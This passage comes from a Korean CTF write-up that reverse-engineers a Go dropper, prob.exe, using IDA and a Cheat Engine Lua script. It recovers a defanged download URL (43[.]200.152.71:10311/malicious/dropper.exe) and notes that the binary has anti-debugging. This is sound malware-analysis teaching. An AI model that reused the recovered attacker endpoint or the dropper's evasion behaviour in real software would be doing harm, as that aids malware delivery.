    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;DownloadFile&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;위 결과를 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt;이 가장 핵심 함수인 것으로 보인다.&lt;/p&gt;

&lt;p&gt;그러나 궁금한 점, 대체 뭐가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt;을 콜하는 걸까? 사실 모르겠음… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_main&lt;/code&gt;이 엔트리인데 왜 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt;과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_main&lt;/code&gt; 간의 관계는 안 보이는 거지?&lt;/p&gt;

&lt;p&gt;이건 동적 분석하면서 알아보기로 했음&lt;/p&gt;

&lt;p&gt;은 그냥 원라인 디버깅하면 알수있을듯…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;14-동적-분석&quot;&gt;1.4. 동적 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%204.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;일단 함수 오프셋을 계산하기 위한 기본 정보 세이브해두고&lt;/p&gt;

&lt;p&gt;Cheat Engine에서 prob.exe를 실행시키거나, 실행중인 prob.exe에 attach하거나 해야 하는데&lt;/p&gt;

&lt;p&gt;전자는 안됨 왜 안될까&lt;/p&gt;

&lt;p&gt;후자는 cmd에서 실행하면 됨&lt;/p&gt;

&lt;p&gt;그러나 IDA를 켠 채로 후자를 시도하면 안티디버거에 걸리기 때문에 prob.exe가 바로 죽어버림&lt;/p&gt;

&lt;p&gt;즉 치트엔진을 붙일 수 없음&lt;/p&gt;

&lt;p&gt;따라서 IDA를 끄고 하시길 바랍니다&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%205.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x75ee80&lt;/code&gt;이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt; 함수의 시작 주소였고 베이스는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400000&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;그럼 오프셋은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x35ee80&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;141-실패-기록&quot;&gt;1.4.1. 실패 기록&lt;/h3&gt;

&lt;p&gt;치트엔진으로 별짓을 다했음&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;cmd에서 exec되는 흐름을 보고 싶어서 x96dbg 붙였음&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;→ cmd는 권한 문제로 디버깅이 어려움&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;그래서 한 생각: prob가 콜하는 dll을 전부 확인하자&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;→ 사유: 얘가 지금 http 통신 열려다가 server가 안 열어줘서 오류가 나고 죽는 거니까, http 통신의 오류를 담당하는 dll을 따라가면 bp를 걸 수 있겠지&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;prob가 콜하는 dll 리스트&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%206.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powerprof.dll&lt;/code&gt;: 머신의  전원에 관한 기능을 주관하는 dll&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ucrtbase.dll&lt;/code&gt;: Universal C 런타임&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcrt4.dll&lt;/code&gt;: RPC를 지원하며, 보통 네트워크 및 인터넷 통신을 구현할 때 사용&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UMPDC.dll&lt;/code&gt;: 유저 모드에서의 전원 의존성 조정을 위해 사용됨&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws2_32.dll&lt;/code&gt;: 소켓 통신에 사용됨&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mswsock.dll&lt;/code&gt;: TCP/IP 프로토콜을 통해 인터넷 통신을 하기 위해 사용됨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;실패!!!!!!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;142-성공&quot;&gt;1.4.2. 성공!&lt;/h3&gt;

&lt;p&gt;그래서 다른 방법을 씀&lt;/p&gt;

&lt;p&gt;프로그램을 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_DownloadFile&lt;/code&gt;에 넘기는 파라미터 중 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode(…, main_encoded_filepath)&lt;/code&gt; 가 있음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%207.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_encoded_filepath&lt;/code&gt;는 static으로 정의된 문자열의 시작을 가리키는 포인터를 저장하고 있음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%208.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, 이 문자열이 Decoding을 거쳐서 어떤 문자열이 되는지 알아내면 되므로&lt;/p&gt;

&lt;p&gt;위 문자열의 시작 주소에 어떤 인스트럭션이 접근하는지를 알아내면 그쪽에서 Decoding된 문자열을 알아낼 수 있을 것임&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%209.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;인간승리&lt;/p&gt;

&lt;p&gt;ida상에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dec_download_path&lt;/code&gt;가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode&lt;/code&gt;의 결과를 받는 것으로 나와 있기 때문에, 이게 메모리상의 어떤 부분에 있는지 확인해 보는 게 좋을 것 같음.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2010.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;저기다가 bp걸고 메모리에 어떤 값이 왔다갔다하는지 알고싶은데&lt;/p&gt;

&lt;p&gt;어떻게 해야 시작할 때부터 bp를 걸 수 있지?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;→ 충분히 민첩하면 됨(원라인 디버깅)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;따라서 lua 스크립트로 프로세스 실행한 다음 홀드 걸어놓고 디버거를 어태치해서 bp걸은 다음 메모리 뷰를 띄우도록 해 보았음&lt;/p&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- prob.exe 실행 및 브레이크포인트 설정&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 파일 실행 및 프로세스 Attach&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:\\Users\\toubv\\Desktop\\fiesta2024\\S-2\\prob.exe&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;-- prob.exe의 절대 경로를 지정하세요.&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellExecute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;-- 프로그램 실행&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 잠시 대기 (프로세스 실행 및 메모리 준비 시간 확보)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 프로세스에 Attach&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;prob.exe&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;openProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;prob.exe 프로세스에 Attach 완료!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;프로세스를 찾을 수 없습니다. Attach 실패.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 엔트리 포인트 주소 찾기&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enumModules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;nil&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ipairs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processName&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;모듈 베이스 주소: 0x%X&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 엔트리 포인트에 브레이크포인트 설정&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entryPoint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;-- PE 헤더 분석이 필요하면 여기에 오프셋 추가&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;debug_setBreakpoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entryPoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x35f580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;엔트리 포인트 (0x%X)에 브레이크포인트가 설정되었습니다.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entryPoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x35f580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 메모리 뷰 띄움&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;openMemoryView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;치트엔진 안써봐서 메뉴부터 막 누르고 다녔는데&lt;/p&gt;

&lt;p&gt;거기에서 lua script 보자마자 이걸 언젠가 쓰겠군 했음&lt;/p&gt;

&lt;p&gt;그런데 이렇게 빠르게 쓰게 될 줄은 몰랐음&lt;/p&gt;

&lt;p&gt;결과&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2011.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;prob.exe+35f580&lt;/code&gt;은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dec_downloadPath&lt;/code&gt;에 파일 다운로드 경로를 저장하기 위해  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode&lt;/code&gt;를 콜하는 부분으로, 해당 과정을 거치고 나면 디코딩된 경로가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dec_downloadPath&lt;/code&gt;에 저장될 것임&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://tip.golang.org/src/cmd/compile/abi-internal#:~:text=Function%20call%20argument%20and%20result%20passing%C2%B6&quot;&gt;go로 컴파일된 프로그램의 어셈블리 규칙&lt;/a&gt;에 따르면 함수의 리턴값은 레지스터에 저장될 확률이 높으니&lt;sup id=&quot;fnref:result_passing&quot;&gt;&lt;a href=&quot;#fn:result_passing&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 레지스터부터 확인해 보는 게 좋을 것 같았고, 레지스터 중 스택 및 힙에 할당된 메모리 영역(메모리 덤프에서 명시된 Base와 Size 감안할 때)에 포함되는 주소를 가진 레지스터를 하나하나 확인해 보니, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://43[.]200.152.71:10311&lt;/code&gt; 문자열을 확인할 수 있었음&lt;/p&gt;

&lt;p&gt;추가로, 다음 루틴에서 콜하는 함수(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_downloadFile&lt;/code&gt;)를 따라간 다음 리턴값이 담긴 rax를 확인해 보니, 다음과 같은 문자열을 확인할 수 있었고&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2012.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;43[.]200.152.71:10311/malicious/dropper.exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;그 다음에 다시 한 번 콜되는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode&lt;/code&gt; 함수가 무엇을 리턴하는지도 확인해 봄&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2013.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;43[.]200.152.71:10311/tmp/flag1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;즉, 총 2개의 파일을 2번의 요청에 걸쳐 요청한다는 걸 알 수 있었음&lt;/p&gt;

&lt;p&gt;근데 사실 이런 건 샌드박스에 먼저 돌려보는 게 좋아서… 그리고 문제 파일에는 안티샌드박스가 안 걸려 있어서 돌리면 그냥 바로 나온다. 난 그렇게 풀었고…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-번외-ida-오류-고치기&quot;&gt;2. 번외: IDA 오류 고치기&lt;/h1&gt;

&lt;h2 id=&quot;21-main_main-함수-분석&quot;&gt;2.1. main_main 함수 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2014.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_morestack_noctxt_abi0&lt;/code&gt; 함수는 커스텀 함수가 아닌 것으로 추정됨(검색 결과 다른 대회의 리버싱 문제에서도 확인)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;github_com_CRYBOII_buggi_SimpleRun();&lt;/code&gt; 함수는 안티디버거 함수 실행부&lt;/li&gt;
  &lt;li&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode(v0,v1)&lt;/code&gt;부터 분석 시작&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-main_wdcodev0-v1-함수-분석&quot;&gt;2.2. main_WDcode(v0, v1) 함수 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2015.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;함수 호출을 잘못 인식한 결과라고 하니, 해당 라인으로 가서 함수 콜의 형태를 올바르게 고쳐줘야 한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode(v0, v1)&lt;/code&gt;은 인자 2개를 받아서 시작&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode&lt;/code&gt; 내부에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;와 값을 상호작용하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;machine&lt;/code&gt; 관련 요소는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbx&lt;/code&gt; 레지스터 2개
    &lt;ol&gt;
      &lt;li&gt;왜냐하면 함수는 외부에서 파라미터를 전달받으면 함수 내부에서 사용하기 위해 스택 프레임 내에 값을 전달해놓기 때문임&lt;/li&gt;
      &lt;li&gt;물론 이 점은 콜링 컨벤션이 달라지면 달라지겠지만, 어쨌든 저 2개 레지스터가 수상한 건 맞음&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;문제가 발생한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x75f5a6&lt;/code&gt; 라인에서는 아래와 같이 함수를 콜하고 있었음&lt;/p&gt;

    &lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F580&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;r14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;10h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F584&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;jbe&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;loc_75F686&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F58A&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F58B&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F58E&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;sub&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F592&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;arg_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rbx&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F597&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;arg_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F59C&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rbx&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F59F&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;qword&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;_78A840&lt;/span&gt;
